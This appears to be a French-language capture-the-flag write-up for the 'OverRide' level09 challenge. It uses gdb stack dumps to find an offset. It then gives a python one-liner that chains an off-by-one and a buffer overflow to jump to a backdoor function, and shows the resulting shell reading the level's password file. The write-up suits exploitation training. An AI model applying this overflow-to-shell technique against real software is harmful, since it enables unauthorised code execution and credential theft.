# LEVEL09

```
level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: Liri
>: Welcome, Liri
>: Msg @Unix-Dude
>>: Hello World !
>: Msg sent!
level09@OverRide:~$ 
```

En faisant la source nous pouvons voir différentes fonctions :

```
handle_message()
secret_backdoor()
set_msg()
set_username()
main()
```

La fonction `secret_backdoor()` fait un appel à la commande `system()`, il va donc falloir réussir à mettre l'adresse de `secret_backdoor()` dans **EIP**.

```
(gdb) info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```

```
(gdb) i r rsp rbp rip
rsp            0x7fffffffe500   0x7fffffffe500
rbp            0x7fffffffe5c0   0x7fffffffe5c0
rip            0x555555554930   0x555555554930 <handle_msg+112>

(gdb) x/32xg $rsp
0x7fffffffe500: 0x4242424242424242      0x4242424242424242
0x7fffffffe510: 0x4242424242424242      0x4242424242424242
0x7fffffffe520: 0x4242424242424242      0x4242424242424242
0x7fffffffe530: 0x4242424242424242      0x4242424242424242
0x7fffffffe540: 0x4242424242424242      0x4242424242424242
0x7fffffffe550: 0x4242424242424242      0x000000000000002d
0x7fffffffe560: 0x000000000000000a      0x0000555555554c10
0x7fffffffe570: 0x00007fffffffe6b0      0x00007ffff7a95d45
0x7fffffffe580: 0x00007ffff7dd4260      0x41414141f7a9608f
0x7fffffffe590: 0x4141414141414141      0x4141414141414141
0x7fffffffe5a0: 0x4141414141414141      0x4141414141414141
0x7fffffffe5b0: 0x0000005841414141      0x00007fffffffe5d0
0x7fffffffe5c0: 0x00007fffffffe5d0      0x0000555555554abd
0x7fffffffe5d0: 0x0000000000000000      0x00007ffff7a3d7ed
0x7fffffffe5e0: 0x0000000000000000      0x00007fffffffe6b8
0x7fffffffe5f0: 0x0000000155554000      0x0000555555554aa8

13 ligne * 16 octets = 208 (rsp <-> rip)
```


```
(python -c 'print("A" * 40 + "\xff")'; python -c 'print("A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")'; echo "/bin/sh"; cat) | ./level09
```

```
level09@OverRide:~$ (python -c 'print("A" * 40 + "\xff")'; python -c 'print("A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")'; echo "/bin/sh"; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```